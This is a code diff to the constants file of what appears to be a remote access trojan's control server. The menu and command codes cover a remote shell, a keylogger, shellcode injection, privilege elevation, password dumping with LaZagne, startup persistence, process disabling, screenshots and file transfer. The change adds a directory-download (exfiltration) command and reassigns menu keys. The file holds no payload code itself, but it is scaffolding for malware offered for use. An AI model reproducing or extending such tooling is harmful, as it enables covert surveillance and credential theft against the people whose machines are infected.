@@ -18,7 +18,7 @@ CLIENT_ADD_STARTUP = 6
 CLIENT_RMV_STARTUP = 7
 CLIENT_SCREENSHOT = 8
 CLIENT_UPLOAD_FILE = 9
-CLIENT_RECV_FILE = 10
+CLIENT_DWNL_FILE = 10
 CLIENT_LOCK = 11
 CLIENT_SHUTDOWN = 12
 CLIENT_RESTART = 13
@@ -41,6 +41,9 @@ CLIENT_SHELLCODE = 31
 CLIENT_ELEVATE = 32
 CLIENT_PWD = 34
 CLIENT_GET_VULN = 35
+CLIENT_DWNL_DIR = 36
+SERVER_UPLOAD_DIR = 37
+SERVER_UPLOAD_DIR_DONE = 38
 
 # all menu arguments must be a single char
 MENU_HELP = "H"
@@ -61,21 +64,21 @@ SERVER_MAIN_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                             {"arg": MENU_CLOSE_CONNECTION, "info": "Close connection", "arg2": "index"},
                             {"arg": MENU_CLOSE_ALL, "info": "Close/clear all connections"}]
 
-MENU_INTERACT_RECV = "R"
-MENU_INTERACT_SEND = "S"
-MENU_INTERACT_SCRN = "N"
-MENU_INTERACT_STARTUP = "A"
-MENU_INTERACT_INFO = "O"
+MENU_INTERACT_DWNL = "D"
+MENU_INTERACT_UPLOAD = "U"
+MENU_INTERACT_SCRN = "S"
+MENU_INTERACT_STARTUP = "P"
+MENU_INTERACT_INFO = "I"
 MENU_INTERACT_SHELL = "E"
-MENU_INTERACT_PYTHON = "I"
-MENU_INTERACT_DISABLE_PROCESS = "D"
+MENU_INTERACT_PYTHON = "Y"
+MENU_INTERACT_DISABLE_PROCESS = "T"
 MENU_INTERACT_KEYLOG = "K"
 MENU_INTERACT_LOCK = "L"
 MENU_INTERACT_BACKGROUND = "B"
 MENU_INTERACT_CLOSE = "C"
 MENU_INTERACT_SHELLCODE = "J"
-MENU_INTERACT_ELEVATE = "T"
-MENU_INTERACT_PWD = "P"
+MENU_INTERACT_ELEVATE = "A"
+MENU_INTERACT_PWD = "R"
 MENU_INTERACT_VULN = "V"
 
 # arg2 commands
@@ -92,6 +95,8 @@ MENU_INTERACT_PWD_PASS = "password"
 
 MENU_INTERACT_VULN_EXP_ONLY = "exploit-only"
 
+MENU_INTERACT_DWNL_DIR = "directory"
+
 SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                                 {"arg": MENU_INTERACT_SHELL, "info": "Open remote shell"},
                                 {"arg": MENU_INTERACT_PYTHON, "info": "Open python interpreter"},
@@ -106,8 +111,8 @@ SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                                  "note": "using LaZagne"},
                                 {"arg": MENU_INTERACT_KEYLOG, "info": "Keylogger",
                                  "arg2": f"({MENU_INTERACT_KEYLOG_START}) ({MENU_INTERACT_KEYLOG_STOP}) ({MENU_INTERACT_KEYLOG_DUMP})"},
-                                {"arg": MENU_INTERACT_RECV, "info": "Receive file"},
-                                {"arg": MENU_INTERACT_SEND, "info": "Send file"},
+                                {"arg": MENU_INTERACT_DWNL, "info": "Download file", "optional_arg2": f"({MENU_INTERACT_DWNL_DIR})"},
+                                {"arg": MENU_INTERACT_UPLOAD, "info": "Upload file"},
                                 {"arg": MENU_INTERACT_SCRN, "info": "Take screenshot"},
                                 {"arg": MENU_INTERACT_STARTUP, "info": "Add to startup",
                                  "arg2": f"({MENU_INTERACT_STARTUP_ADD}) ({MENU_INTERACT_STARTUP_RMV})",
